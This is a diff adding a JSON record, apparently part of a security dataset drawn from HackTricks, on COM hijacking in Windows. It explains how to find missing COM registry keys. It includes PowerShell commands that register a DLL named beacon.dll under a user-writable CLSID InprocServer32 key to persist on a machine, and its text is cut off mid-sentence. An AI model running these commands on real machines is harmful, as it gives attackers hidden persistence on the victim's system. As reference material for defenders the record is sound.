@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_e7f9b6513b70",
+  "category": "windows-hardening",
+  "title": "com hijacking",
+  "description": "# COM Hijacking\n\n{{#include ../../banners/hacktricks-training.md}}\n\n### Searching not existent COM components\n\nAs the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:\n\n- **RegOpenKey** operations.\n- where the _Result_ is **NAME NOT FOUND**.\n- and the _Path_ ends with **InprocServer32**.\n\nOnce you have decided wh",
+  "payloads": [
+    "# COM Hijacking",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "### Searching not existent COM components",
+    "As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:",
+    "- **RegOpenKey** operations.",
+    "- where the _Result_ is **NAME NOT FOUND**.",
+    "- and the _Path_ ends with **InprocServer32**.",
+    "Once you have decided which not existent COM to impersonate execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._",
+    "```bash",
+    "New-Item -Path \"HKCU:Software\\Classes\\CLSID\" -Name \"{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\"",
+    "New-Item -Path \"HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\" -Name \"InprocServer32\" -Value \"C:\\beacon.dll\"",
+    "New-ItemProperty -Path \"HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\" -Name \"ThreadingModel\" -Value \"Both\"",
+    "### Hijackable Task Scheduler COM components",
+    "Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.",
+    "<pre class=\"language-powershell\"><code class=\"lang-powershell\"># Show COM CLSIDs"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/windows-local-privilege-escalation/com-hijacking.md"
+  ]
+}
